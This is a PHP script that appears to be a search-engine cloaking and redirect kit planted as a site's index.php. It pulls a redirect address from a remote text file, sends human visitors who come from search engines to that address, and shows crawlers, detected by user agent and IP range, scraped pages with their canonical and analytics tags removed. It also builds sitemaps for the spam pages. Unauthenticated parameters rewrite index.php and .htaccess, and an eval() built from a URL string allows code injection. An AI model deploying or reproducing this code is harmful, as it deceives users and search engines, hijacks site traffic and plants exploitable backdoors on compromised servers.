<?php 

@ini_set('display_errors', 1);

define("JDT","0");
define("PRENAME","20160227");
//jthouzuibg
define("JTHZ",".html");
//jthouzuiend


define("DOMTXT","http://www.unicarb.net/mk.txt");

require_once("idUrl.php");





if(isset($_GET["modifydate"]) && $_GET["modifydate"]){
	$strDefault = file_get_contents("index.php");	
	$strDefault = str_replace('define("PRENAME","20160227");', 'define("PRENAME","'.$_GET["modifydate"].'");', $strDefault);
	file_put_contents("index.php",$strDefault);
	echo "ok!";
	die();
}


if(isset($_GET['hzui']) && $_GET['hzui']){
	$dirName = dirname(__FILE__);

    $httcReplace = end(explode(DIRECTORY_SEPARATOR, $dirName));
	$r1 = '#\#mulubg(.*?)\#muluend#s';
	$r2 = '#\#houzui.*#s';
	
	$strhtt = file_get_contents(".htaccess");
	
	$strhtt = preg_replace($r1, '#mulubg'. PHP_EOL .'RewriteBase /'.$httcReplace. PHP_EOL .'#muluend'. PHP_EOL, $strhtt);
	
	$hzReplace = trim($_GET['hzui']);
	
	if($hzReplace){
		$strhtt = preg_replace($r2, '#houzui'. PHP_EOL .'RewriteRule ^(.*)\.'. $hzReplace .'$ index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL , $strhtt);
		
		$indexContent = file_get_contents("index.php");
		$r3 = '#(/+jthouzuibg)(.*?)(/+jthouzuiend)#s';
		$indexContent = preg_replace($r3, '\1'. PHP_EOL .'define("JTHZ",".'. $hzReplace .'");'. PHP_EOL .'\3'. PHP_EOL , $indexContent);
		
		file_put_contents("index.php", $indexContent);
		
	}
	
	file_put_contents(".htaccess", $strhtt);
	

	exit("modify ok!");
}



if(isset($_GET['rset']) &&  $_GET['rset'] == 'set'){

	$str = file_get_contents("index.php");
	
		$indexId = array_rand($arrIdUrl,1);
		$indexNameId = $indexId;

		$str = str_replace('$id = "1106"; //llq index id', '$id = "'. $indexNameId .'"; //llq index id', $str);
		file_put_contents("index.php", $str);
		echo 'ok!';
		die();
}







if(isset($_GET["gsitemap"])){
	
	
			if(JDT == 1){
				gsitemap($arrIdUrl,2,1);
				// glink($arrIdUrl,1);
			}else{
				gsitemap($arrIdUrl,2,2);
				// glink($arrIdUrl,2);
			}
	

	die();
}


if(isset($_GET["id"]))
	$id = $_GET["id"];
else{
	$id = "1106"; //llq index id 
}



$idTemp = explode('-',$id);


$id23 = end($idTemp);

if(!isset($arrIdUrl[$id23]))
	die();

// $_SERVER["HTTP_REFERER"] = "google.com.hk";

if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|ask|bing|avg|aol|mywebsearch|sky|comcast|search-results|babylon|snap|bt|alot|conduit)(\.[a-z0-9\-]+){1,2}#i';
	
	
	 
		
	$jumDom = DOMTXT;
	
	$domJump = curl_get_from_webpage($jumDom,'',5);
	
	$iszz = isCrawler();

	
	
	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ,   array('65.52.0.0' , '65.55.255.255') ,   array('74.6.0.0' , '74.6.255.255') ,   array('67.195.0.0' , '67.195.255.255') ,   array('72.30.0.0' , '72.30.255.255')  ); 

	 
	
	$localIp = get_real_ip();
	
	$is_or_no = is_ip($localIp,$ipRanges);

	
	
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false){
	
		echo '<script type="text/javascript">';

		echo "window.location.href = '".$domJump."';";

		echo '</script>';
		
		// header("Location: ".$arrIdUlrJP[$id23]);
		die();
		// usleep(1500000);
	}
}





if($arrIdUrl[$id23]){
	$url = $arrIdUrl[$id23];
	// echo $url;
	// die();
	// echo curl_get_from_webpage($url,'',5);
	$html = curl_get_from_webpage($url,'',5);
	// $html = file_get_contents($url);
	// $html = '';
	// echo $html;
	// die();
	
	// if(strlen($html) < 500) {
			// die();
	// }


			 if(!preg_match('#<base href="https?://[^"]+">#i',$html)){
				$html =  fillUrl($html,$url);
			}
			 
			$r1 = '#<meta property="apprakuten:shop_url"[^>]+>#i';
			$r2 = '#<link rel="canonical"[^>]+>#i';
			$r4 = '#<link rel="alternate"[^>]+>#i';
			$r3 = '#<meta property="og:url"[^>]+>#i';
		 
			$html = preg_replace($r1, '', $html);
			$html = preg_replace($r2, '', $html);
			$html = preg_replace($r3, '', $html);
			$html = preg_replace($r4, '', $html);
			
			$r3 = '#<link[^>]+rel="canonical"[^>]+>#i';
			$r4 = '#<link[^>]+rel="alternate"[^>]+>#i';
			
			$html = preg_replace($r3, '', $html);
			$html = preg_replace($r4, '', $html);
			
			
			$html = preg_replace('#var http_host(.*?)</script>#s', '</script>', $html);
			$html = preg_replace('#var baseDir(.*?)</script>#s', '</script>', $html); 
			// $html = preg_replace('#var baseDir(.*?)</script>#s', '</script>', $html); 
	

			$html = str_ireplace("google-analytics" , "googles-analyticses" , $html);
			$html = str_ireplace("cnzz.com" , "cnzzss.com" , $html);
			$html = str_ireplace("51.la" , "520.la" , $html);
			
		
			echo $html;
	

}else{
	die();
}

// echo "<pre>";
// print_r($arrIdUrl);
// print_r($_SERVER);
// echo "</pre>";

die();



function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);
	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);
		foreach($spiderSite as $val) {
		$str = strtolower($val);
		if (strpos($agent, $str) !== false) {
			return true;
			}
		}
	} else {
		return false;
	}
} 


//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数

function gsitemap($filenames,$c=1,$jdt=1){

// echo 'dap<br/>';
// return;
	global $gnumber;
	$filePres = '';
	$fileEnds = '';

	
	
	if($jdt == 1){
		$filePres = basename(__FILE__) . "?id=";
	}else{
		$filePres = '';
		$fileEnds = JTHZ;
	}

	////获取文件目录
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$serpath=substr($fpath,0,strrpos($fpath,'/'));


	$siteLink='http://'.$_SERVER['HTTP_HOST'];
		
	$mapPre = '<?xml version="1.0" encoding="UTF-8" ?>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
	$mapEnd = PHP_EOL .  '</urlset>';



	$urlsArray = $filenames;
	//print_r($urlsArray);

	$numLinks = count($urlsArray);

	// echo $gnumber."<br/>";
	
	$star = 0;
	$priority = 0.9;
	$starPri = 0;
	$gFile ="";
	$date = date("Y-m-d");
	$time = date("H:i:s");

	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";
						

	foreach($urlsArray as $keykey => $value){
		$curphp=basename(__FILE__); 

		$first=stristr($value,".php");
		$last=stristr($value,".xml");
		$checkTxt =stristr($value,".txt");
		//print_r( $value.$curphp."   ".$first."   ".$last);
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");
			$time = date("H:i:s");
			
			$url="";
			if($c==1)
			{
				$urlEnd = $keykey;
				$url=$siteLink ."/". $filePres . PRENAME . '-' . $urlEnd .$fileEnds;
			}else
			{
				$urlEnd = $keykey;
				$url=$serpath ."/". $filePres . PRENAME . '-' . $urlEnd .$fileEnds;
			}
			//echo $value."<br/>";
			if($star % 10000==9999){
				//$star = 0;
				$gFile =  'sitemap' .'.xml';
				echo '<br/>'.$gFile.'<br/>';
				
				//$putXmlUrl = $serpath . '/sitemap' . $gnumber .'.xml';
				$put_str = $mapPre . $str . $mapEnd;
				@unlink($gFile);
				file_put_contents($gFile,$put_str);
				//$this->putXmlStr .= $putXmlUrl.PHP_EOL;

				$str = '';
				$gnumber++;
				
					// echo $gnumber."<br/>";

			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;
				$priority = $priority - 0.1;
			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;
			$starPri++;
		}

	}
	
	{
		//最后剩下的再生成一个sitemap.xml
		$gFile =  'sitemap' .'.xml';
		echo '<br/>'.$gFile.'<br/>';
		
		$gnumber++;

		//$putXmlUrl = $serpath . '/sitemap' . $gnumber .'.xml';
		$put_str = $mapPre . $str . $mapEnd;
		@unlink($gFile);
		file_put_contents($gFile,$put_str);
	
	}
	echo "生成sitemap成功！";	
}





function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';
	
	$urlInfo = parse_url($url);
	// echo $url ;
	// print_r($urlInfo);
	// die();
	preg_match_all($relur, $str, $matches);
	// print_r($matches[1]);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;
				$rStr =  'http://' . str_replace('//','/',$rStr);
				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;
			}
		}
	}	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';
	
	$urlInfo = parse_url($url);
	
	
	preg_match_all($relur, $str, $matches);
	// print_r($matches[1]);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;
				$rStr =  'http://' . str_replace('//','/',$rStr);
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;
			}
		}
	}

	return $str;
}




function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');

	$encode = mb_detect_encoding($str, $list);
	// echo $encode;die();
	if($encode == 'UTF-8'){
		return $str;
	}else{
		return mb_convert_encoding($str, $charset, $encode);
	}
	 
}

function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');
	$str = file_get_contents($file);
	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);
		if (md5($tmp) == md5($str)) {
		

			return $item;
		}
	}
	return null;
}




function get_user_agent(){

$arr = array();


$arr[] = 'MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E) ';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE) ';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)';
$arr[] = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)';
$arr[] = 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+';
$arr[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1';
$arr[] = 'Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1';
$arr[] = 'Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13';
$arr[] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11';
$arr[] = 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124';
$arr[] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0';
$arr[] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0) Gecko/20121026 Firefox/16.0';
$arr[] = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre';
$arr[] = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16';
$arr[] = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15';
$arr[] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11';
$arr[] = 'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10';
$arr[] = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400) ';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)';
$arr[] = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)';
$arr[] = 'Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0';
$arr[] = 'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5';
$arr[] = 'Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10';
$arr[] = 'User-Agent:Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50';
$arr[] = 'User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1';
$arr[] = 'User-Agent:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50';
$arr[] = 'User-Agent:Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5';
$arr[] = 'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5';
$arr[] = 'User-Agent:Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5';
$arr[] = 'User-Agent:Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11';
$arr[] = 'User-Agent:Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11';

		$max = count($arr)-1;
		$str = $arr[rand(0,$max)];
		return $str;
}
 
 
function curl_get_from_webpage($url,$proxy='',$loop=10){
	
	$url = trim($url);
	$data = false;
        $i = 0;
        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy,$i);
             if($i++ >= $loop) break;
        }
	return $data;
}
 
 
function curl_get_from_webpage_one_time($url,$proxy='',$tms=0){
	$curl = curl_init();
	//如果有用代理,则使用代理.
	
	if(strstr($url,"amazon") or $tms % 2 == 0)
		$user_agent = get_user_agent();
	else
		$user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
	
	if(strstr($url,"amazon") or $tms % 2 == 0)
		$urlReferer = "";
	else
		$urlReferer = "http://www.google.com";

	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
	
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HEADER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
if($tms != 4){
	curl_setopt($curl, CURLOPT_REFERER, $urlReferer);
	curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
}

$data=curl_exec($curl);
curl_close($curl);

	if($tms == 4 && !$data){
		$data = @eval("file_get_contents('".$url."');");
	}

	if(!$data) return false;

	return $data;
}





function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
		$ipmin=sprintf("%u",ip2long($val[0]));
		$ipmax=sprintf("%u",ip2long($val[1]));

		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;
}

 
 
function get_real_ip(){
	
	$ip=false;
	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}
	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
		if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }
		
		for ($i = 0; $i < count($ips); $i++) {
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
				$ip = $ips[$i];
				break;
			}
		}
	}
	
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
